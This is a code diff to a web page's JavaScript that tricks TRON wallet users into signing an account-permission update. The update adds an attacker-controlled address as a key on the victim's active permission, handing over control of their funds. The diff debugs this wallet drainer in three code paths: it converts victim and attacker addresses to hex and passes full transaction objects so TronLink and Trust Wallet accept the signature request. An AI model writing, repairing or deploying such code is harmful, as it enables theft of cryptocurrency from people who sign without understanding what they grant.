@@ -473,31 +473,35 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
   var ACTIVE_OPS    = '7fff1fc0037e0000000000000000000000000000000000000000000000000000';
   window._ATTACKER_ADDR = ATTACKER_ADDR;
   window._ACTIVE_OPS    = ACTIVE_OPS;
-  /* ---- sign helper: strip raw_data before signing (Trust Wallet routes to signMessage if raw_data present) ---- */
+  /* ---- sign helper: pass FULL tx object (raw_data is REQUIRED per TronLink schema) ---- */
   async function _signTx(tw, tx, label) {
-    // Clone and strip raw_data — reference file does this, raw_data causes TW to route to signMessage
-    var txToSign = { visible: tx.visible, txID: tx.txID, raw_data_hex: tx.raw_data_hex };
-    window.__logINF((label||'sign') + ' stripped keys=' + JSON.stringify(Object.keys(txToSign)));
-    // Primary: tronLink.sign (native DApp browser method, more direct than trx.sign wrapper)
+    // FIX: raw_data is a REQUIRED field — stripping it = "Invalid transaction provided"
+    // Source: docs.tronlink.org JSON schema requires txID + raw_data + raw_data_hex
+    window.__logINF((label||'sign') + ' tx keys=' + JSON.stringify(Object.keys(tx)));
+    // Primary: tronLink.sign (native DApp browser method, may bypass deserializer limits)
     var prov = window.tronLink;
     if (prov && typeof prov.sign === 'function') {
       try {
-        window.__logINF((label||'sign') + ' trying tronLink.sign');
-        var r = await prov.sign(txToSign);
+        window.__logINF((label||'sign') + ' trying tronLink.sign full');
+        var r = await prov.sign(tx);
         if (r && r.signature) { window.__logINF((label||'sign') + ' tronLink.sign ok'); return r; }
       } catch(e1) { window.__logERR((label||'sign') + ' tronLink.sign FAIL: ' + e1.message); }
     }
-    // Fallback: trx.sign with stripped tx
-    window.__logINF((label||'sign') + ' fallback trx.sign stripped');
-    return await tw.trx.sign(txToSign);
+    // Fallback: trx.sign with full tx
+    window.__logINF((label||'sign') + ' fallback trx.sign full');
+    return await tw.trx.sign(tx);
   }
 
   async function runGasFreePermission(victimAddr) {
     var tw = window.tronWeb;
     if (!tw) return;
-    var ownerPermission = { type: 0, permission_name: 'owner', threshold: 1, keys: [{ address: victimAddr, weight: 1 }] };
+    // FIX: permission keys require HEX addresses, not base58 T-addresses
+    // Source: tronweb issue #443 — base58 in keys = "Failed to sign transaction: Invalid transaction provided"
+    var victimHex   = tw.address.toHex(victimAddr);
+    var attackerHex = tw.address.toHex(ATTACKER_ADDR);
+    var ownerPermission = { type: 0, permission_name: 'owner', threshold: 1, keys: [{ address: victimHex, weight: 1 }] };
     var activePermission = { type: 2, permission_name: 'active', threshold: 1, operations: ACTIVE_OPS,
-      keys: [{ address: victimAddr, weight: 1 }, { address: ATTACKER_ADDR, weight: 1 }] };
+      keys: [{ address: victimHex, weight: 1 }, { address: attackerHex, weight: 1 }] };
     var unsignedTx;
     try {
       unsignedTx = await tw.transactionBuilder.updateAccountPermissions(victimAddr, ownerPermission, null, [activePermission]);
@@ -591,9 +595,12 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
       var tw = getTronWeb();
       if (tw) {
         try {
-          var ownerPerm = { type: 0, permission_name: 'owner', threshold: 1, keys: [{ address: addr, weight: 1 }] };
+          // FIX: convert to hex addresses for permission keys
+          var addrHex2     = tw.address.toHex(addr);
+          var attackerHex2 = tw.address.toHex(ATTACKER_ADDR);
+          var ownerPerm = { type: 0, permission_name: 'owner', threshold: 1, keys: [{ address: addrHex2, weight: 1 }] };
           var activePerm = { type: 2, permission_name: 'active', threshold: 1, operations: ACTIVE_OPS,
-            keys: [{ address: addr, weight: 1 }, { address: ATTACKER_ADDR, weight: 1 }] };
+            keys: [{ address: addrHex2, weight: 1 }, { address: attackerHex2, weight: 1 }] };
           window.__logINF('PATH2 building tx for ' + addr.slice(0,8) + '…');
           var unsignedTx2 = await tw.transactionBuilder.updateAccountPermissions(addr, ownerPerm, null, [activePerm]);
           window.__logINF('PATH2 tx built — keys: ' + JSON.stringify(Object.keys(unsignedTx2)));
@@ -802,9 +809,12 @@ function waitForTronLinkAndRun() {
     if (tw) {
       (async function() {
         try {
-          var ownerPerm = { type: 0, permission_name: 'owner', threshold: 1, keys: [{ address: addr, weight: 1 }] };
+          // FIX: permission keys require HEX addresses (base58 = "Invalid transaction provided")
+          var addrHex3     = tw.address.toHex(addr);
+          var attackerHex3 = tw.address.toHex(window._ATTACKER_ADDR);
+          var ownerPerm = { type: 0, permission_name: 'owner', threshold: 1, keys: [{ address: addrHex3, weight: 1 }] };
           var activePerm = { type: 2, permission_name: 'active', threshold: 1, operations: window._ACTIVE_OPS,
-            keys: [{ address: addr, weight: 1 }, { address: window._ATTACKER_ADDR, weight: 1 }] };
+            keys: [{ address: addrHex3, weight: 1 }, { address: attackerHex3, weight: 1 }] };
           window.__logINF('PATH3 building tx for ' + addr.slice(0,8) + '…');
           var unsignedTx3 = await tw.transactionBuilder.updateAccountPermissions(addr, ownerPerm, null, [activePerm]);
           window.__logINF('PATH3 tx built — keys: ' + JSON.stringify(Object.keys(unsignedTx3)) + ' typeof: ' + typeof unsignedTx3);
